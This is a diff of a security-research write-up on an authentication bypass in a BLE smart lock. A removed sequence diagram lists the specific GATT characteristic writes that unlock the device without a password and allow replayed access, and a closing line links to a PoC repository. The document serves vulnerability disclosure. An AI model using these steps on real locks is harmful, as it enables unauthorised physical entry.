-3. **Static credentials are insufficient** - Dynamic authentication is essential
-4. **Encryption alone is not enough** - Proper pairing and authentication are required
-5. **Defense in depth matters** - Multiple security layers prevent single points of failure
+- **BLE security is often overlooked** — manufacturers prioritise convenience over security
+- **State machines require careful design** — authentication state must be validated at every step
+- **Static credentials are insufficient** — dynamic authentication is essential
+- **Encryption alone is not enough** — proper pairing and authentication are both required
+- **Defence in depth matters** — multiple security layers prevent single points of failure
 
 ### Research Impact
 
-- **Severity:** CRITICAL (CVSS 9.8)
-- **Attack Complexity:** LOW
-- **Privileges Required:** NONE
-- **User Interaction:** NONE
-- **Impact:** Complete device compromise
+| Metric | Value |
+|--------|-------|
+| CVSS Score | **9.8 (Critical)** |
+| Attack Complexity | LOW |
+| Privileges Required | NONE |
+| User Interaction | NONE |
+| Impact | Complete device compromise |
 
 ### Timeline
 
-| Date | Milestone |
-|------|-----------|
-| Day 1 | BTSnoop capture and initial analysis |
-| Day 2 | Protocol reverse engineering |
-| Day 3 | Manual exploitation success |
-| Day 4 | Automation and vulnerability discovery |
-| Day 5 | Root cause analysis and documentation |
-
-### Responsible Disclosure
-
-This research was conducted on personally owned devices for legitimate security research purposes. Findings have been responsibly disclosed to the manufacturer with a 90-day disclosure timeline before public release.
+| Day | Milestone |
+|-----|-----------|
+| 1 | BTSnoop capture and initial analysis |
+| 2 | Protocol reverse engineering |
+| 3 | Manual exploitation success |
+| 4 | Automation and vulnerability discovery |
+| 5 | Root cause analysis and documentation |
 
 ---
 
-## References & Further Reading
-
-1. **Bluetooth Core Specification v5.3** - Bluetooth SIG
-2. **NIST SP 800-121r2** - Guide to Bluetooth Security
-3. **OWASP IoT Top 10** - IoT Security Risks
-4. **BLE Security Best Practices** - Nordic Semiconductor
-5. **"Gattacking Bluetooth Smart Devices"** - Slawomir Jasek (DEF CON 24)
-
----
-
-## Legal Disclaimer
-
-This research was conducted on personally owned devices for legitimate security research purposes. All testing was performed in a controlled environment. Unauthorized access to devices you do not own is illegal. This research is provided for educational purposes only.
-
----
-
-**Published:** 2026-01-21
-**Tags:** #BLE #IoT #Security #SmartLock #ReverseEngineering #Vulnerability
-
----
-
-*If you found this research valuable, please share it with the security community. Feedback and questions are welcome!*
-
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant L as Smart Lock (FFD0)
-    participant U as Legitimate User
-
-    Note over A,L: Reconnaissance Phase
-    A->>L: BLE Scan (0xFFD0 service)
-    L-->>A: Device Advertisement
-
-    A->>L: GATT Connect
-    A->>L: Enumerate Characteristics
-    L-->>A: FFD6, FFD7, FFD8, FFD9, FFDA
-
-    Note right of L: No BLE pairing required
-
-    Note over A,L: Vulnerability Testing
-    A->>L: Write to FFD8 (0x03) - Skip authentication test
-    L-->>A: Write Accepted
-
-    A->>L: Write to FFD9 (0x01) - Unlock without password
-    L-->>A: UNLOCKED
-
-    Note right of L: CRITICAL: Auth bypass!
-
-    Note over A,L: Exploitation Phase
-    A->>L: Write FFD6: 00 12 34 56 78 00 00 00 00 - Send password
-    L-->>A: FFD7 Notification: 01 FF - Auth success
-
-    A->>L: Write FFD8: 0x03 - Set open time
-    A->>L: Write FFD9: 0x01 - Execute unlock
-    L-->>A: Motor Activation
-
-    Note right of L: Physical unlock achieved
-
-    Note over A,U: Persistent Access Phase
-    A->>L: Replay: FFD6 + FFD8 + FFD9 - Same credentials work indefinitely
-    L-->>A: Unlocked again
-
-    Note right of L: Static password allows unlimited replays
-
-    U->>L: BLE Connection
-    L-->>U: Already Unlocked
-
-    Note right of U: User unaware of unauthorized access
-```
+*All testing performed on a personally owned device for legitimate security research. Full PoC, APK, and assessment framework: [github.com/V33RU/quicklock-bluetooth](https://github.com/V33RU/quicklock-bluetooth)*
